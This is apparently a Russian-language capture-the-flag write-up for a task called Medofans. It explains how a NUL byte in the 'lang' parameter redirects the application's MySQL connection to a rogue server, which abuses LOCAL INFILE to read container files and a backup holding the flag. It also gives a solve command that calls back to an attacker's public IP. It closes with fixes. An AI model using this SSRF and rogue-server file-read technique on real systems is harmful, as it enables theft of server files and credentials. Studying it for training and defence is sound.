# Medofans (Badgerfuns)

**Флаг:** `avito{Hon3y_Badg3R_DoNt_C4rE_Abou7_lOcal_1nFile}`

Параметр `lang` определяет MySQL-хост: приложение дописывает к нему `.db.internal`.
NUL-байт обрывает имя на границе PHP и C, поэтому `lang=<IP>%00` направляет подключение
к нашему серверу на порту 3306. Через MySQL `LOCAL INFILE` он запрашивает файлы веб-контейнера.

## Чтение файла

Подставной сервер объявляет возможность `CLIENT_LOCAL_FILES`, принимает авторизацию
пакетом `OK` и отвечает на первый SQL-запрос пакетом `0xFB` с именем файла.
Клиент воспринимает это как запрос `LOCAL INFILE` и передаёт содержимое файла серверу.

Первым читается `/proc/self/mountinfo`. Среди стандартных подключений `/etc/hosts`,
`/etc/hostname`, `/etc/resolv.conf` находится отдельный файл:

```text
/opt/backups/hbf_de_backup_2019-05-05.sql
```

Повторный `LOCAL INFILE` получает этот SQL-архив, из которого выделяется флаг.
Сохранённый немецкий ответ API содержит лишь `/*REDACTED*/`, поэтому одного просмотра
локализации недостаточно.

## Запуск

Нужны работающий сервис и сервер обратного вызова, доступный ему по TCP/3306.
HTTP-туннель не переносит MySQL-протокол:

```bash
uv run python medofans/solve_medofans.py \
  --target https://hbfuns-<slug>.avitoctf.ru --connect-back <PUBLIC_IP>
```

[solve_medofans.py](solve_medofans.py) запускает MySQL-обработчик, вызывает SSRF,
разбирает `mountinfo` и запрашивает найденные нестандартные файловые подключения.
Адреса в команде нужно заменить параметрами своего экземпляра.

## Файлы

[app.js](app.js) — сохранённый клиент сайта; `content_en.json`, `content_ru.json` и
`content_de.json` — ответы локализаций. [FLAG.txt](FLAG.txt) содержит результат.
Исходники PHP, `mountinfo` и SQL-архив извлекаются со стенда и не включены в Git.

Нужно выбирать хост базы из фиксированного списка, отклонять NUL во входных данных
и отключить `LOCAL INFILE` у клиента, которому не требуется загрузка локальных файлов.
